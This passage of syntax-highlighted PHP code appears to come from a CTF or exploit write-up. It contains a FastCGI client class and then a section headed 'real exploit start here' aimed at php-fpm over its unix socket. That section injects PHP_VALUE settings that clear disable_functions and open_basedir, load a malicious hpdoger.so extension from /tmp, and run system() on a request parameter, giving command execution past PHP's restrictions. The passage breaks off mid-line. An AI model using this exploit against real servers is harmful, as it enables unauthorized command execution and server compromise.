<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">const</span> OVERLOADED           = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">const</span> UNKNOWN_ROLE         = <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">const</span> MAX_CONNS            = <span class="hljs-string">&#x27;MAX_CONNS&#x27;</span>;<br>    <span class="hljs-keyword">const</span> MAX_REQS             = <span class="hljs-string">&#x27;MAX_REQS&#x27;</span>;<br>    <span class="hljs-keyword">const</span> MPXS_CONNS           = <span class="hljs-string">&#x27;MPXS_CONNS&#x27;</span>;<br>    <span class="hljs-keyword">const</span> HEADER_LEN           = <span class="hljs-number">8</span>;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Socket</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@var</span> Resource</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_sock</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Host</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@var</span> String</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_host</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Port</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@var</span> Integer</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_port</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Keep Alive</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@var</span> Boolean</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_keepAlive</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Constructor</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> String $host Host of the FastCGI application</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> Integer $port Port of the FastCGI application</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$host</span>, <span class="hljs-variable">$port</span> = <span class="hljs-number">9001</span></span>) // <span class="hljs-title">and</span> <span class="hljs-title">default</span> <span class="hljs-title">value</span> <span class="hljs-title">for</span> <span class="hljs-title">port</span>, <span class="hljs-title">just</span> <span class="hljs-title">for</span> <span class="hljs-title">unixdomain</span> <span class="hljs-title">socket</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;_host = <span class="hljs-variable">$host</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;_port = <span class="hljs-variable">$port</span>;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Define whether or not the FastCGI application should keep the connection</span><br><span class="hljs-comment">     * alive at the end of a request</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> Boolean $b true if the connection should stay alive, false otherwise</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setKeepAlive</span>(<span class="hljs-params"><span class="hljs-variable">$b</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;_keepAlive = (<span class="hljs-keyword">boolean</span>)<span class="hljs-variable">$b</span>;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;_keepAlive &amp;&amp; <span class="hljs-keyword">$this</span>-&gt;_sock) &#123;<br>            fclose(<span class="hljs-keyword">$this</span>-&gt;_sock);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Get the keep alive status</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> Boolean true if the connection should stay alive, false otherwise</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getKeepAlive</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;_keepAlive;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Create a connection to the FastCGI application</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;_sock) &#123;<br>            <span class="hljs-comment">//$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5);</span><br>            <span class="hljs-keyword">$this</span>-&gt;_sock = stream_socket_client(<span class="hljs-keyword">$this</span>-&gt;_host, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">5</span>);<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;_sock) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;Unable to connect to FastCGI application&#x27;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Build a FastCGI packet</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> Integer $type Type of the packet</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> String $content Content of the packet</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> Integer $requestId RequestId</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buildPacket</span>(<span class="hljs-params"><span class="hljs-variable">$type</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$requestId</span> = <span class="hljs-number">1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$clen</span> = strlen(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">return</span> chr(<span class="hljs-built_in">self</span>::VERSION_1)         <span class="hljs-comment">/* version */</span><br>            . chr(<span class="hljs-variable">$type</span>)                    <span class="hljs-comment">/* type */</span><br>            . chr((<span class="hljs-variable">$requestId</span> &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) <span class="hljs-comment">/* requestIdB1 */</span><br>            . chr(<span class="hljs-variable">$requestId</span> &amp; <span class="hljs-number">0xFF</span>)        <span class="hljs-comment">/* requestIdB0 */</span><br>            . chr((<span class="hljs-variable">$clen</span> &gt;&gt; <span class="hljs-number">8</span> ) &amp; <span class="hljs-number">0xFF</span>)     <span class="hljs-comment">/* contentLengthB1 */</span><br>            . chr(<span class="hljs-variable">$clen</span> &amp; <span class="hljs-number">0xFF</span>)             <span class="hljs-comment">/* contentLengthB0 */</span><br>            . chr(<span class="hljs-number">0</span>)                        <span class="hljs-comment">/* paddingLength */</span><br>            . chr(<span class="hljs-number">0</span>)                        <span class="hljs-comment">/* reserved */</span><br>            . <span class="hljs-variable">$content</span>;                     <span class="hljs-comment">/* content */</span><br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Build an FastCGI Name value pair</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> String $name Name</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> String $value Value</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> String FastCGI Name value pair</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buildNvpair</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$nlen</span> = strlen(<span class="hljs-variable">$name</span>);<br>        <span class="hljs-variable">$vlen</span> = strlen(<span class="hljs-variable">$value</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$nlen</span> &lt; <span class="hljs-number">128</span>) &#123;<br>            <span class="hljs-comment">/* nameLengthB0 */</span><br>            <span class="hljs-variable">$nvpair</span> = chr(<span class="hljs-variable">$nlen</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span><br>            <span class="hljs-variable">$nvpair</span> = chr((<span class="hljs-variable">$nlen</span> &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) . chr((<span class="hljs-variable">$nlen</span> &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) . chr((<span class="hljs-variable">$nlen</span> &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) . chr(<span class="hljs-variable">$nlen</span> &amp; <span class="hljs-number">0xFF</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$vlen</span> &lt; <span class="hljs-number">128</span>) &#123;<br>            <span class="hljs-comment">/* valueLengthB0 */</span><br>            <span class="hljs-variable">$nvpair</span> .= chr(<span class="hljs-variable">$vlen</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span><br>            <span class="hljs-variable">$nvpair</span> .= chr((<span class="hljs-variable">$vlen</span> &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) . chr((<span class="hljs-variable">$vlen</span> &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) . chr((<span class="hljs-variable">$vlen</span> &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) . chr(<span class="hljs-variable">$vlen</span> &amp; <span class="hljs-number">0xFF</span>);<br>        &#125;<br>        <span class="hljs-comment">/* nameData &amp; valueData */</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$nvpair</span> . <span class="hljs-variable">$name</span> . <span class="hljs-variable">$value</span>;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Read a set of FastCGI Name value pairs</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> String $data Data containing the set of FastCGI NVPair</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> array of NVPair</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readNvpair</span>(<span class="hljs-params"><span class="hljs-variable">$data</span>, <span class="hljs-variable">$length</span> = <span class="hljs-literal">null</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$array</span> = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$length</span> === <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-variable">$length</span> = strlen(<span class="hljs-variable">$data</span>);<br>        &#125;<br>        <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-variable">$p</span> != <span class="hljs-variable">$length</span>) &#123;<br>            <span class="hljs-variable">$nlen</span> = ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$nlen</span> &gt;= <span class="hljs-number">128</span>) &#123;<br>                <span class="hljs-variable">$nlen</span> = (<span class="hljs-variable">$nlen</span> &amp; <span class="hljs-number">0x7F</span> &lt;&lt; <span class="hljs-number">24</span>);<br>                <span class="hljs-variable">$nlen</span> |= (ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;) &lt;&lt; <span class="hljs-number">16</span>);<br>                <span class="hljs-variable">$nlen</span> |= (ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;) &lt;&lt; <span class="hljs-number">8</span>);<br>                <span class="hljs-variable">$nlen</span> |= (ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;));<br>            &#125;<br>            <span class="hljs-variable">$vlen</span> = ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$vlen</span> &gt;= <span class="hljs-number">128</span>) &#123;<br>                <span class="hljs-variable">$vlen</span> = (<span class="hljs-variable">$nlen</span> &amp; <span class="hljs-number">0x7F</span> &lt;&lt; <span class="hljs-number">24</span>);<br>                <span class="hljs-variable">$vlen</span> |= (ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;) &lt;&lt; <span class="hljs-number">16</span>);<br>                <span class="hljs-variable">$vlen</span> |= (ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;) &lt;&lt; <span class="hljs-number">8</span>);<br>                <span class="hljs-variable">$vlen</span> |= (ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;));<br>            &#125;<br>            <span class="hljs-variable">$array</span>[substr(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$nlen</span>)] = substr(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$p</span>+<span class="hljs-variable">$nlen</span>, <span class="hljs-variable">$vlen</span>);<br>            <span class="hljs-variable">$p</span> += (<span class="hljs-variable">$nlen</span> + <span class="hljs-variable">$vlen</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$array</span>;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Decode a FastCGI Packet</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> String $data String containing all the packet</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> array</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decodePacketHeader</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;version&#x27;</span>]       = ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">0</span>&#125;);<br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;type&#x27;</span>]          = ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">1</span>&#125;);<br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;requestId&#x27;</span>]     = (ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">2</span>&#125;) &lt;&lt; <span class="hljs-number">8</span>) + ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">3</span>&#125;);<br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;contentLength&#x27;</span>] = (ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">4</span>&#125;) &lt;&lt; <span class="hljs-number">8</span>) + ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">5</span>&#125;);<br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;paddingLength&#x27;</span>] = ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">6</span>&#125;);<br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;reserved&#x27;</span>]      = ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">7</span>&#125;);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$ret</span>;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Read a FastCGI Packet</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> array</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readPacket</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$packet</span> = fread(<span class="hljs-keyword">$this</span>-&gt;_sock, <span class="hljs-built_in">self</span>::HEADER_LEN)) &#123;<br>            <span class="hljs-variable">$resp</span> = <span class="hljs-keyword">$this</span>-&gt;decodePacketHeader(<span class="hljs-variable">$packet</span>);<br>            <span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;content&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;contentLength&#x27;</span>]) &#123;<br>                <span class="hljs-variable">$len</span>  = <span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;contentLength&#x27;</span>];<br>                <span class="hljs-keyword">while</span> (<span class="hljs-variable">$len</span> &amp;&amp; <span class="hljs-variable">$buf</span>=fread(<span class="hljs-keyword">$this</span>-&gt;_sock, <span class="hljs-variable">$len</span>)) &#123;<br>                    <span class="hljs-variable">$len</span> -= strlen(<span class="hljs-variable">$buf</span>);<br>                    <span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;content&#x27;</span>] .= <span class="hljs-variable">$buf</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;paddingLength&#x27;</span>]) &#123;<br>                <span class="hljs-variable">$buf</span>=fread(<span class="hljs-keyword">$this</span>-&gt;_sock, <span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;paddingLength&#x27;</span>]);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$resp</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Get Informations on the FastCGI application</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> array $requestedInfo information to retrieve</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> array</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getValues</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$requestedInfo</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;connect();<br>        <span class="hljs-variable">$request</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$requestedInfo</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$info</span>) &#123;<br>            <span class="hljs-variable">$request</span> .= <span class="hljs-keyword">$this</span>-&gt;buildNvpair(<span class="hljs-variable">$info</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>        &#125;<br>        fwrite(<span class="hljs-keyword">$this</span>-&gt;_sock, <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::GET_VALUES, <span class="hljs-variable">$request</span>, <span class="hljs-number">0</span>));<br>        <span class="hljs-variable">$resp</span> = <span class="hljs-keyword">$this</span>-&gt;readPacket();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-built_in">self</span>::GET_VALUES_RESULT) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;readNvpair(<span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;content&#x27;</span>], <span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;length&#x27;</span>]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;Unexpected response type, expecting GET_VALUES_RESULT&#x27;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Execute a request to the FastCGI application</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> array $params Array of parameters</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> String $stdin Content</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> String</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">request</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$params</span>, <span class="hljs-variable">$stdin</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$response</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-comment">//        $this-&gt;connect();</span><br>        <span class="hljs-variable">$request</span> = <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::BEGIN_REQUEST, chr(<span class="hljs-number">0</span>) . chr(<span class="hljs-built_in">self</span>::RESPONDER) . chr((<span class="hljs-keyword">int</span>) <span class="hljs-keyword">$this</span>-&gt;_keepAlive) . str_repeat(chr(<span class="hljs-number">0</span>), <span class="hljs-number">5</span>));<br>        <span class="hljs-variable">$paramsRequest</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$params</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>            <span class="hljs-variable">$paramsRequest</span> .= <span class="hljs-keyword">$this</span>-&gt;buildNvpair(<span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$paramsRequest</span>) &#123;<br>            <span class="hljs-variable">$request</span> .= <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::PARAMS, <span class="hljs-variable">$paramsRequest</span>);<br>        &#125;<br>        <span class="hljs-variable">$request</span> .= <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::PARAMS, <span class="hljs-string">&#x27;&#x27;</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$stdin</span>) &#123;<br>            <span class="hljs-variable">$request</span> .= <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::STDIN, <span class="hljs-variable">$stdin</span>);<br>        &#125;<br>        <span class="hljs-variable">$request</span> .= <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::STDIN, <span class="hljs-string">&#x27;&#x27;</span>);<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;data=&#x27;</span>.urlencode(<span class="hljs-variable">$request</span>));<br><span class="hljs-comment">//        fwrite($this-&gt;_sock, $request);</span><br><span class="hljs-comment">//        do &#123;</span><br><span class="hljs-comment">//            $resp = $this-&gt;readPacket();</span><br><span class="hljs-comment">//            if ($resp[&#x27;type&#x27;] == self::STDOUT || $resp[&#x27;type&#x27;] == self::STDERR) &#123;</span><br><span class="hljs-comment">//                $response .= $resp[&#x27;content&#x27;];</span><br><span class="hljs-comment">//            &#125;</span><br><span class="hljs-comment">//        &#125; while ($resp &amp;&amp; $resp[&#x27;type&#x27;] != self::END_REQUEST);</span><br><span class="hljs-comment">//        var_dump($resp);</span><br><span class="hljs-comment">//        if (!is_array($resp)) &#123;</span><br><span class="hljs-comment">//            throw new Exception(&#x27;Bad request&#x27;);</span><br><span class="hljs-comment">//        &#125;</span><br><span class="hljs-comment">//        switch (ord($resp[&#x27;content&#x27;]&#123;4&#125;)) &#123;</span><br><span class="hljs-comment">//            case self::CANT_MPX_CONN:</span><br><span class="hljs-comment">//                throw new Exception(&#x27;This app can\&#x27;t multiplex [CANT_MPX_CONN]&#x27;);</span><br><span class="hljs-comment">//                break;</span><br><span class="hljs-comment">//            case self::OVERLOADED:</span><br><span class="hljs-comment">//                throw new Exception(&#x27;New request rejected; too busy [OVERLOADED]&#x27;);</span><br><span class="hljs-comment">//                break;</span><br><span class="hljs-comment">//            case self::UNKNOWN_ROLE:</span><br><span class="hljs-comment">//                throw new Exception(&#x27;Role value not known [UNKNOWN_ROLE]&#x27;);</span><br><span class="hljs-comment">//                break;</span><br><span class="hljs-comment">//            case self::REQUEST_COMPLETE:</span><br><span class="hljs-comment">//                return $response;</span><br><span class="hljs-comment">//        &#125;</span><br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// real exploit start here</span><br><span class="hljs-comment">//if (!isset($_REQUEST[&#x27;cmd&#x27;])) &#123;</span><br><span class="hljs-comment">//    die(&quot;Check your input\n&quot;);</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//if (!isset($_REQUEST[&#x27;filepath&#x27;])) &#123;</span><br><span class="hljs-comment">//    $filepath = __FILE__;</span><br><span class="hljs-comment">//&#125;else&#123;</span><br><span class="hljs-comment">//    $filepath = $_REQUEST[&#x27;filepath&#x27;];</span><br><span class="hljs-comment">//&#125;</span><br><br><span class="hljs-variable">$filepath</span> = <span class="hljs-string">&quot;/var/www/html/add_api.php&quot;</span>;    <span class="hljs-comment">// 目标主机已知的PHP文件的路径</span><br><span class="hljs-variable">$req</span> = <span class="hljs-string">&#x27;/&#x27;</span>.basename(<span class="hljs-variable">$filepath</span>);<br><span class="hljs-variable">$uri</span> = <span class="hljs-variable">$req</span> .<span class="hljs-string">&#x27;?&#x27;</span>.<span class="hljs-string">&#x27;command=whoami&#x27;</span>;    <span class="hljs-comment">// 啥也不是, 不用管</span><br><span class="hljs-variable">$client</span> = <span class="hljs-keyword">new</span> FCGIClient(<span class="hljs-string">&quot;unix:///var/run/php-fpm.sock&quot;</span>, -<span class="hljs-number">1</span>);<br><span class="hljs-variable">$code</span> = <span class="hljs-string">&quot;&lt;?php system(\$_REQUEST[&#x27;command&#x27;]); phpinfo(); ?&gt;&quot;</span>;    <span class="hljs-comment">// 啥也不是, 不用管</span><br><span class="hljs-variable">$php_value</span> = <span class="hljs-string">&quot;unserialize_callback_func = system\nextension_dir = /tmp\nextension = hpdoger.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = &quot;</span>;<span class="hljs-comment">//加载hpdoger.so文件</span><br><span class="hljs-variable">$params</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;GATEWAY_INTERFACE&#x27;</span> =&gt; <span class="hljs-string">&#x27;FastCGI/1.0&#x27;</span>,<br>    <span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>    =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>    <span class="hljs-string">&#x27;SCRIPT_FILENAME&#x27;</span>   =&gt; <span class="hljs-variable">$filepath</span>,<br>    <span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>       =&gt; <span class="hljs-variable">$req</span>,<br>    <span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>      =&gt; <span class="hljs-string">&#x27;command=whoami&#x27;</span>,<br>    <span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>       =&gt; <span class="hljs-variable">$uri</span>,<br>    <span class="hljs-string">&#x27;DOCUMENT_URI&#x27;</span>      =&gt; <span class="hljs-variable">$req</span>,<br><span class="hljs-comment">#&#x27;DOCUMENT_ROOT&#x27;     =&gt; &#x27;/&#x27;,</span><br>    <span class="hljs-string">&#x27;PHP_VALUE&#x27;</span>         =&gt; <span class="hljs-variable">$php_value</span>,<br>    <span class="hljs-string">&#x27;SERVER_SOFTWARE&#x27;</span>   =&gt; <span class="hljs-string">&#x27;80sec/wofeiwo&#x27;</span>,<br>    <span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>       =&gt; <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>    <span class="hljs-string">&#x27;REMOTE_PORT&#x27;</span>       =&gt; <span class="hljs-string">&#x27;9001&#x27;</span>,<br>    <span class="hljs-string">&#x27;SERVER_ADDR&#x27;</span>       =&gt; <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>    <span class="hljs-string">&#x27;SERVER_PORT&#x27;</span>       =&gt; <span class="hljs-string">&#x27;80&#x27;</span>,<br>    <span class="hljs-string">&#x27;SERVER_NAME&#x27;</span>       =&gt; <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>    <span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span>   =&gt; <span class="hljs-string">&#x27;HTTP/1.1&#x27;</span>,<br>    <span class="hljs-string">&#x27;CONTENT_LENGTH&#x27;</span>    =&gt; strlen(<span class="hljs-variable">$code</span>)<br>);<br><span class="hljs-comment">// print_r($_REQUEST);</span><br><span class="hljs-comment">// print_r($params);</span><br><span class="hljs-comment">//echo &quot;Call: 